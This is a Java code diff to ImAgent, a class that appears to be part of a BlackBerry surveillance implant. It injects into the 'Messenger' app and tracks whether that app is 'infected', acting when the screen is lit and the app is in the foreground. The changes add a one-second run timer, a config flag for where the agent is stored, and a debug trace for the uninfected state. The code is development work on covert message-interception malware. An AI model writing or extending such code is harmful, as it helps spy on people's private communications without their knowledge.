@@ -11,6 +11,7 @@ package blackberry.agent;
 
 import net.rim.device.api.system.Backlight;
 import blackberry.AppListener;
+import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.injection.AppInjector;
@@ -18,7 +19,6 @@ import blackberry.interfaces.ApplicationObserver;
 import blackberry.interfaces.BacklightObserver;
 import blackberry.utils.Utils;
 
-// TODO: Auto-generated Javadoc
 /**
  * PIM, calendario, appuntamenti.
  */
@@ -27,12 +27,15 @@ public final class ImAgent extends Agent implements BacklightObserver,
     //#ifdef DEBUG
     static Debug debug = new Debug("ImAgent", DebugLevel.VERBOSE);
     //#endif
-
+    
+    private static final long APP_TIMER_PERIOD = 1000;
+    
     AppInjector appInjector;
     boolean infected;
 
     String appName = "Messenger";
 
+    
     /**
      * Instantiates a new task agents
      * 
@@ -40,7 +43,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
      *            the agent status
      */
     public ImAgent(final boolean agentEnabled) {
-        super(Agent.AGENT_IM, agentEnabled , true, "ImAgent");
+        super(Agent.AGENT_IM, agentEnabled , Conf.AGENT_IM_ON_SD, "ImAgent");
         
         //#ifdef IM_FORCED
         enable(true);
@@ -59,8 +62,8 @@ public final class ImAgent extends Agent implements BacklightObserver,
         this(agentStatus);
         parse(confParams);
 
-        setDelay(NEVER);
-        setPeriod(NEVER);
+        setPeriod(APP_TIMER_PERIOD);
+        setDelay(APP_TIMER_PERIOD);
     }
 
     public synchronized void actualStart() {
@@ -111,6 +114,13 @@ public final class ImAgent extends Agent implements BacklightObserver,
     }
 
     public void actualRun() {
+        
+        if(!infected){
+            //#ifdef DEBUG
+            debug.trace("actualRun: not infected");
+            //#endif
+        }
+        
         if (infected && Backlight.isEnabled() && isAppForeground) {
             //#ifdef DEBUG
             debug.info("actualRun, infected, enabled, foreground");
@@ -132,6 +142,9 @@ public final class ImAgent extends Agent implements BacklightObserver,
             debug.trace("parse: null");
         }
         //#endif
+        
+        setPeriod(APP_TIMER_PERIOD);
+        setDelay(APP_TIMER_PERIOD);
         return false;
     }
 
